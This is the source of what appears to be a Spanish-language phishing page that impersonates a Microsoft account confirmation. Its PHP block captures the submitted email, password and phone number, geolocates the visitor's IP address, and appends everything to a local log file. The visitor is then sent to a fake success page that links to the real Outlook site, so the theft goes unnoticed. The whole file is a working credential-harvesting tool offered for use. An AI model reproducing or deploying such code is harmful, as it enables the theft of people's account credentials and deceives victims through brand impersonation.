
<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
    
    $file = fopen("envio.txt", "a");
    
fwrite($file, "".$_POST['email']." | ".$_POST['pass']." | ".$_POST['numero']." | ".date('Y-m-d')." | ".date('H:i:s')." | ".$userp." ".$cc." ".$city."  " . PHP_EOL);
fwrite($file, "----------------------------------------- " . PHP_EOL);
fclose($file);
header("location:Registrado.html");

?> 




<!DOCTYPE html>

<html>

<head>
	<link rel="icon" href="favicon.png" type="SCAM/favicon.png" sizes="16x16" />
	<title>Confirma tu cuenta Microsoft</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
	<link rel="stylesheet" type="text/css" href="estilo.css">
	<link rel= "stylesheet" href= "https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.0.0/animate.compat.css">
</head>

<body>

<section class="box" >
	
	<div class="animated fadeIn" id="container2">
	<div class="animated fadeInRight" id="inner2">



		<img class="logo1" src="logo1.svg" alt="logo1.svg">

		<h2> Confirmar cuenta</h2>

			<h4> Tu cuenta ha sido confirmada con éxito.</h4>
			
			<a href="https://outlook.live.com/owa/" class="btn btn-success">Finalizar</a>
			
		</form>
	</div>
	</div>
	

	<div class="bottom" >
		<h5>Términos de uso</h5>
		<h5>Privacidad y cookies</h5>
	</div>
	
</section>

</body>

</html>